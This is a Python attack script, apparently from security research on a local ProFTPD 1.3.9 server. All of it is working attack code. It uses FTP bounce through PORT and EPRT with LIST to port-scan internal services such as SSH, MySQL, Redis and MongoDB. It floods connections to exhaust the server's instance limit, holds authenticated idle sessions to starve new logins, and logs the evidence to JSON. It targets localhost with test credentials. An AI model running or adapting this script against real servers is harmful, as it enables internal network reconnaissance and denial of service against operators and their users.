#!/usr/bin/env python3
"""
ProFTPD 1.3.9 — Attack Script 03: FTP Bounce + Resource Exhaustion
independent security research. — Phase 3

1. FTP bounce attack via PORT/EPRT — use server to port-scan internal services
2. SSRF via PORT to internal addresses
3. Connection flood — exhaust MaxInstances (100)
4. Slow-read / connection hold exhaustion
5. Half-open connection flood (connect without sending)
"""
import socket, time, json, os, threading
from datetime import datetime

HOST, PORT = "127.0.0.1", 21
USER, PASS = "ftptest", "ftptest123"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def drain_recv(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk: break
            data += chunk
            decoded = data.decode('utf-8', errors='replace')
            lines = [l for l in decoded.strip().split('\n') if l.strip()]
            if lines:
                last = lines[-1]
                if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                    break
    except socket.timeout:
        pass
    return data.decode('utf-8', errors='replace').strip()

def connect_auth():
    s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
    drain_recv(s)
    s.sendall(f"USER {USER}\r\n".encode()); drain_recv(s)
    s.sendall(f"PASS {PASS}\r\n".encode()); r = drain_recv(s)
    return s, "230" in r

def cmd(s, c, timeout=5):
    s.sendall((c+"\r\n").encode())
    s.settimeout(timeout)
    try: return drain_recv(s, timeout)
    except: return ""

def check_alive():
    try:
        s = socket.socket(); s.settimeout(3); s.connect((HOST, PORT))
        d = s.recv(256); s.close()
        return b"220" in d
    except: return False

def main():
    print("="*60)
    print("Attack 03: FTP Bounce + Resource Exhaustion")
    print("ProFTPD 1.3.9 — Phase 3 Targeted Attacks")
    print("="*60)

    evidence = {"attack": "bounce_flood", "date": datetime.now().isoformat(), "tests": {}}

    # -------------------------------------------------------
    # TEST 1: FTP Bounce via PORT — probe internal ports
    # PORT h1,h2,h3,h4,p1,p2 tells server to connect TO that addr:port
    # Use to probe if internal services are open
    # -------------------------------------------------------
    print("\n[1] FTP Bounce Attack — probe internal ports via PORT command")
    # Format: PORT h1,h2,h3,h4,p1,p2  (port = p1*256 + p2)
    probe_ports = [
        (22, "SSH"),
        (25, "SMTP"),
        (80, "HTTP"),
        (443, "HTTPS"),
        (3306, "MySQL"),
        (5432, "PostgreSQL"),
        (6379, "Redis"),
        (8080, "HTTP-alt"),
        (9200, "Elasticsearch"),
        (27017, "MongoDB"),
    ]

    bounce_results = {}
    for target_port, service in probe_ports:
        s, ok = connect_auth()
        if not ok:
            s.close()
            continue

        p1, p2 = target_port >> 8, target_port & 0xFF
        # Use RETR after PORT to trigger connection to target
        port_resp = cmd(s, f"PORT 127,0,0,1,{p1},{p2}")
        # Try LIST to trigger the connection
        s.sendall(b"LIST\r\n")
        s.settimeout(3)
        try:
            list_resp = s.recv(1024).decode('utf-8','replace')
        except:
            list_resp = "TIMEOUT"

        # 150 = server connected to target (port open)
        # 425 = server couldn't connect (port closed/filtered)
        connected = "150" in list_resp or "125" in list_resp
        bounce_results[service] = {
            "port": target_port,
            "port_response": port_resp[:100],
            "list_response": list_resp[:100],
            "target_open": connected
        }
        print(f"  Port {target_port:5d} ({service:15s}): PORT={port_resp[:30]} LIST={list_resp[:40]}")

        # Send ABOR if transfer started
        if connected:
            try: s.sendall(b"ABOR\r\n"); s.recv(256)
            except: pass
        s.close()
        time.sleep(0.1)

    evidence["tests"]["ftp_bounce"] = {
        "method": "PORT command pointing to internal addresses, then LIST to trigger connection",
        "results": bounce_results
    }

    # -------------------------------------------------------
    # TEST 2: EPRT bounce (IPv6 variant)
    # -------------------------------------------------------
    print("\n[2] EPRT bounce (IPv6/extended mode)")
    eprt_results = {}
    for target_port, service in [(22,"SSH"),(80,"HTTP"),(3306,"MySQL")]:
        s, ok = connect_auth()
        if not ok:
            s.close()
            continue
        # EPRT |1|127.0.0.1|port|
        eprt_resp = cmd(s, f"EPRT |1|127.0.0.1|{target_port}|")
        s.sendall(b"LIST\r\n")
        s.settimeout(3)
        try: list_resp = s.recv(512).decode('utf-8','replace')
        except: list_resp = "TIMEOUT"
        connected = "150" in list_resp or "125" in list_resp
        eprt_results[service] = {
            "port": target_port, "eprt_response": eprt_resp[:80],
            "list_response": list_resp[:80], "target_open": connected
        }
        print(f"  EPRT port {target_port} ({service}): {eprt_resp[:40]} | {list_resp[:40]}")
        s.close()
        time.sleep(0.1)
    evidence["tests"]["eprt_bounce"] = eprt_results

    # -------------------------------------------------------
    # TEST 3: Connection flood — exhaust MaxInstances
    # Our config: MaxInstances 100
    # -------------------------------------------------------
    print("\n[3] Connection flood — exhaust MaxInstances (limit=100)")
    connections = []
    refused_at = None
    flood_results = {}

    for i in range(110):
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((HOST, PORT))
            banner = s.recv(512)
            if b"220" in banner:
                connections.append(s)
            elif b"421" in banner or b"Too many" in banner.lower():
                refused_at = i + 1
                print(f"  Server refused connection #{i+1}: {banner[:80]}")
                s.close()
                break
            else:
                s.close()
                break
        except ConnectionRefusedError:
            refused_at = i + 1
            print(f"  Connection refused at #{i+1}")
            break
        except Exception as e:
            print(f"  Error at #{i+1}: {e}")
            break

    active = len(connections)
    print(f"  Opened {active} simultaneous connections")
    server_alive = check_alive()
    print(f"  Server still responding: {server_alive}")

    flood_results = {
        "connections_opened": active,
        "refused_at": refused_at,
        "server_alive_after": server_alive,
        "max_instances_config": 100
    }
    evidence["tests"]["connection_flood"] = flood_results

    # Close all connections
    for s in connections:
        try: s.sendall(b"QUIT\r\n"); s.close()
        except: pass
    connections.clear()
    time.sleep(2)

    # -------------------------------------------------------
    # TEST 4: Slow-read / connection hold
    # Connect, authenticate, then hold connection open doing nothing
    # -------------------------------------------------------
    print("\n[4] Slow connection hold — authenticated idle sessions")
    idle_connections = []
    for i in range(15):
        try:
            s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
            drain_recv(s)
            s.sendall(f"USER {USER}\r\n".encode()); drain_recv(s)
            s.sendall(f"PASS {PASS}\r\n".encode()); r = drain_recv(s)
            if "230" in r:
                idle_connections.append(s)
        except: pass

    print(f"  Opened {len(idle_connections)} authenticated idle connections")
    # Check if a new connection can still be made
    try:
        test_s = socket.socket(); test_s.settimeout(5); test_s.connect((HOST, PORT))
        banner = test_s.recv(256)
        new_ok = b"220" in banner
        test_s.close()
    except:
        new_ok = False
    print(f"  New connections accepted with {len(idle_connections)} idle: {new_ok}")

    evidence["tests"]["slow_hold"] = {
        "idle_connections": len(idle_connections),
        "new_conn_accepted_during": new_ok
    }

    for s in idle_connections:
        try: s.close()
        except: pass

    time.sleep(1)
    # Verify recovery
    alive_after = check_alive()
    print(f"  Server recovered: {alive_after}")
    evidence["tests"]["recovery"] = {"server_alive": alive_after}

    outfile = f"{EVIDENCE_DIR}/attack_03_bounce_flood.json"
    with open(outfile, 'w') as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence saved to {outfile}")

if __name__ == "__main__":
    main()
